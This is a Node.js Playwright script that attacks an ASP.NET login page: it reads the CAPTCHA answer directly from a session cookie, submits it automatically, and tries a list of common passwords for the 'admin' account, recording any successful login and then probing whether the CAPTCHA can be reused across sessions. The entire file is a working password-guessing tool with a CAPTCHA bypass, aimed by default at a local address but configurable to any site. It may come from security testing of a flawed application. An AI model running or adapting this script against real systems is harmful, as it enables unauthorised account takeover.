const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');

const base = process.env.REAL_SITE_URL || 'http://127.0.0.1:8080/default.aspx';
const outputDir = process.env.OUT_DIR || __dirname;
const outPath = process.env.OUT_PATH || path.join(outputDir, 'real-session-browser-test.json');

async function getCode(context) {
  const cookies = await context.cookies(base);
  const c = cookies.find(x => x.name === 'http1270018080ValidateCode');
  const s = cookies.find(x => x.name === 'ASP.NET_SessionId');
  return { code: c && c.value, session: s && s.value, cookies };
}

async function submit(page, username, password, captcha) {
  await page.locator('#txtLoginName').fill(username);
  await page.locator('#txtPwd').fill(password);
  await page.locator('#txtValidate').fill(captcha);
  const reqs = [];
  const onReq = r => { if (r.method() === 'POST' && /User\/PCLogin|default\.aspx/i.test(r.url())) reqs.push({ method:r.method(), url:r.url(), postData:r.postData() }); };
  page.on('request', onReq);
  await page.locator('#btnLogin').click();
  await page.waitForTimeout(1200);
  page.off('request', onReq);
  return { url: page.url(), text: (await page.locator('body').innerText()).slice(0, 2000), requests: reqs };
}

async function oneAttempt(username, password) {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
  const page = await context.newPage();
  await page.goto(base, { waitUntil: 'networkidle' });
  const before = await getCode(context);
  const result = await submit(page, username, password, before.code);
  const after = await getCode(context);
  const ok = /portal|main|首页|退出|欢迎|logout/i.test(result.url + ' ' + result.text) && !/请输入验证码|验证码错误|密码错误|用户名或密码/i.test(result.text);
  await page.screenshot({ path: path.join(outputDir, `candidate-${username}-${password.replace(/[^a-z0-9]/gi,'_')}.png`), fullPage: true }).catch(()=>{});
  await browser.close();
  return { username, password, before, after, result, ok };
}

async function sessionFlow(username, password) {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
  const page = await context.newPage();
  const events = [];
  page.on('response', r => { if (/User\/PCLogin|ValidateCodeHandler|default\.aspx/i.test(r.url())) events.push({status:r.status(),url:r.url()}); });
  await page.goto(base, { waitUntil: 'networkidle' });
  const first = await getCode(context);
  const wrong = await submit(page, username, password, '0000');
  const afterWrong = await getCode(context);
  await page.locator('#ctrlValidateCode_imgCode').click();
  await page.waitForTimeout(300);
  const refreshed = await getCode(context);
  const sameSessionCorrect = await submit(page, username, password, refreshed.code);
  const sameSessionAfter = await getCode(context);

  const context2 = await browser.newContext({ viewport: { width: 1440, height: 1000 } });
  const page2 = await context2.newPage();
  await page2.goto(base, { waitUntil: 'networkidle' });
  const second = await getCode(context2);
  const newSessionCorrect = await submit(page2, username, password, second.code);
  const secondAfter = await getCode(context2);

  await page.screenshot({ path: path.join(outputDir, 'real-session-same-context.png'), fullPage: true }).catch(()=>{});
  await page2.screenshot({ path: path.join(outputDir, 'real-session-new-context.png'), fullPage: true }).catch(()=>{});
  await browser.close();
  return { first, wrong, afterWrong, refreshed, sameSessionCorrect, sameSessionAfter, second, newSessionCorrect, secondAfter, events };
}

(async() => {
  const candidates = (process.env.CANDIDATES || '123456,12345678,123,admin,888888,111111,000000,123456789,666666,password,1').split(',');
  const candidateResults = [];
  for (const p of candidates) {
    try { candidateResults.push(await oneAttempt('admin', p)); } catch (e) { candidateResults.push({username:'admin',password:p,error:String(e)}); }
  }
  const winner = candidateResults.find(x => x.ok);
  const flow = winner ? await sessionFlow('admin', winner.password) : null;
  const output = { base, candidates: candidateResults.map(x => ({ username:x.username, password:x.password, ok:x.ok, before:x.before, after:x.after, result:x.result, error:x.error })), winner: winner && { username:winner.username, password:winner.password }, flow };
  fs.writeFileSync(outPath, JSON.stringify(output, null, 2));
  console.log(JSON.stringify({outPath, winner:output.winner, candidateSummary:output.candidates.map(x=>({password:x.password,ok:x.ok,error:x.error}))}, null, 2));
})();
